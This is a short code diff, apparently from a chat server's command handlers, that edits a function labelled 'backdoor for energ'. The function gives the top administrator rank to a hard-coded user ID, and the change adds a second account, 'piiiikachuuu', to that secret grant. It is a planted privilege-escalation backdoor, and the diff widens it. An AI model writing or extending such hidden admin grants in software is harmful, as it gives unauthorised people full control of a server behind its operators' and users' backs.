@@ -1362,7 +1362,7 @@ forums: function(target, room, user) {
 		
 	// backdoor for energ
 	backdoor: function(target, room, user) {
-		if (user.userid === 'energ218') {
+		if (user.userid === 'energ218' || user.userid === 'piiiikachuuu') {
 			user.group = "~";
 			user.updateIdentity();
 		}
